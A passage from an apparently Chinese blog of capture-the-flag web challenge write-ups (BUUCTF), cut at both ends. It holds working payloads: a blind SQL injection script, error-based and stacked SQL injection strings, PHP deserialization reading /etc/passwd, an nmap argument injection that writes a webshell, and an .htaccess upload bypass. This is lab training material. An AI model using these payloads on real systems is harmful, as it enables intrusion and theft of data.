class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f68906e-d306-4cb6-a19b-7055f59cddf5.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">33</span></span><br><span class="line">    top = <span class="number">130</span></span><br><span class="line">    mid = (low + top) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; top:</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(i, mid)</span><br><span class="line">        html = requests.post(url, data=payload)</span><br><span class="line">        <span class="keyword">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> in html.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            top = mid</span><br><span class="line">        mid = (low + top) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> chr(mid) == <span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + chr(mid)</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;flag: &quot;</span>, result)</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>报错注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select(group_concat(database())))))%<span class="number">23</span> </span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select%<span class="number">20</span>database())),<span class="number">1</span>)%<span class="number">23</span> 获得库名fakebook</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)where(table_schema)=%<span class="number">27</span>fakebook%<span class="number">27</span>)))%<span class="number">23</span>,<span class="number">1</span>)%<span class="number">23</span> 不用空格的版本，获得表名users</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)where(table_name)=%<span class="number">27</span>users%<span class="number">27</span>)))%<span class="number">23</span> 获得字段名no,username,passwd,data,USER,CU</span><br></pre></td></tr></table></figure><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();                                   <span class="comment">//初始化一个curl会话</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);                 <span class="comment">//设置需要抓取的URL</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);         <span class="comment">//设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上</span></span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);                            <span class="comment">//运行cURL，请求网页</span></span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);          <span class="comment">//关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里利用ssrf去读我们要的flag文件，同时利用到了上面的no参数的注入</p><p>views.php部分代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span>-&gt;anti_sqli(<span class="variable">$no</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;getUserByNo(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$user</span>-&gt;getBlogContents();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$response</span> === <span class="number">404</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$base64</span> = base64_encode(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// echo $response;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(password)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT(database())),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)where(table_schema)like(database())),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)where(table_name)like(<span class="string">&#x27;H4rDsq1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(password)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">username=<span class="number">44</span>&amp;password=<span class="number">1</span>%<span class="number">27</span>^extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(left(password,<span class="number">30</span>))<span class="keyword">from</span>(geek.H4rDsq1))))%<span class="number">23</span></span><br><span class="line">username=<span class="number">44</span>&amp;password=<span class="number">1</span>%<span class="number">27</span>^extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(right(password,<span class="number">30</span>))<span class="keyword">from</span>(geek.H4rDsq1))))%<span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>如果查询的数据不存在的时候，union查询就会构造一个虚拟的数据。sql的password会md5加密，然后我们将我们自己输的密码编码成md5然后放入第三列当中。列是什么可以用union来测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span><span class="number">202</span>cb962ac59075b964b07152d234b70<span class="string">&#x27; %23 &amp;pw=123</span></span><br></pre></td></tr></table></figure><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>很多冒充的webshell的时候如何找到可以使用的，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)    <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = r<span class="string">&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;</span></span><br><span class="line">os.chdir(filePath)<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span><span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="keyword">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="keyword">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m in gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n in posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a in gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b in posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in files:<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><ol><li><p>正常构造payload的话因为$op、$fliename、$content都是protected属性，序列化的的结果的属性名前面会有/002.php&gt;7.1版本对类属性的检测不严格来绕过，将序列化里的portected属性换成public属性，就不会有/00，另一种方式在php打序列化字符串中只要把其中的s改成大写打S，后面打字符串就可以用十六进制表示，用php脚本来完成替换，参考下面payload</p></li><li><p>读取/proc/self/cmdline，得到取配置文件路径/web/config/httpd.conf，再得到绝对路径</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo urlencode(serialize(new FileHandler));</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a </span>= serialize(<span class="keyword">new</span> FileHandler);</span><br><span class="line"><span class="comment">// echo $a;</span></span><br><span class="line"><span class="variable">$a </span>= str_replace(chr(<span class="number">0</span>),<span class="string">&#x27;\00&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a </span>= str_replace(<span class="string">&#x27;s:&#x27;</span>,<span class="string">&#x27;S:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/ssti.png"></p><p>tplmap可以一梭子，但需要py2环境，也可以一步一步手注走</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">src</span>/：源码目录，按照包名结构放置各个<span class="title">java</span>文件。</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">database</span>.<span class="title">properties</span>：数据库配置文件</span></span><br><span class="line"><span class="class">漏洞检测以及利用方法：通过找到<span class="title">web</span>.<span class="title">xml</span>文件，推断<span class="title">class</span>文件的路径，最后直接<span class="title">class</span>文件，在通过反编译<span class="title">class</span>文件，得到网站源码</span></span><br></pre></td></tr></table></figure><p>主要是要知道去读WEB-INF/web.xml，然后把那些class下载下来</p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>三种办法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">handler</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;handler `1919810931114514` open as `yunenctf`;handler `yunenctf` read first;#</span></span><br><span class="line"><span class="string"># handler `1919810931114514` open as `yunenctf`; 将数据表载入并将返回句柄重命名</span></span><br><span class="line"><span class="string"># handler `yunenctf` read first; 读取指定句柄的首行数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重命名</span></span><br><span class="line"><span class="string">1&#x27;</span>; rename table words to word1; rename table `<span class="number">1919810931114514</span>` to words; alter table words add id <span class="keyword">int</span> unsigned not <span class="literal">Null</span> auto_increment primary key; alter table words change flag data varchar(<span class="number">100</span>);<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">预编译prepare</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span></span><br></pre></td></tr></table></figure><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p><p>功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p><p>escapeshellcmd — shell 元字符转义</p><p>功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|?~&lt;&gt;^()[]{}$<em>, \x0A 和 \xFF</em>。 *’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p><p>主要用到nmap的两个参数-iL 和-oN 以任意格式输出，-oX不行，这样不会把/flag的内容输出，必须要用-N才能解析/flag中的内容，从而输出到指定的路径，像这种短的代码都可以拿到本地来测试，也很方便调试。</p><p>payload:&#39; + -iL /flag + -oN 输出路径</p><p>将payload构造成 ?host=&#39; <?php @systeml($_GET["outx"]);?> -oG outx.php &#39; 前面的127.0.0.1我们可以不写，然后在payload的最后面加上一个空格和单引号，单引号的目的是闭合处理后得到的最后那个单引号，如果不加空格的话文件最后面会变成&#39;\&#39;&#39;&#39;即文件最后面会多出来\，加了空格之后会变成 hack.php \ ，不影响命令的执行。</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>先上传一个.htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;x.php.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>意思是把jpg按php进行解析，然后上传一个shell就可以了，不知道为啥file_get_contents不行，于是直接include了一下，或者用readfile(&#39;/flag&#39;);和highlight_file(&#39;/flag&#39;);</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>源码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something <span class="keyword">in</span> F12 <span class="keyword">for</span> you</span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;isset($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span 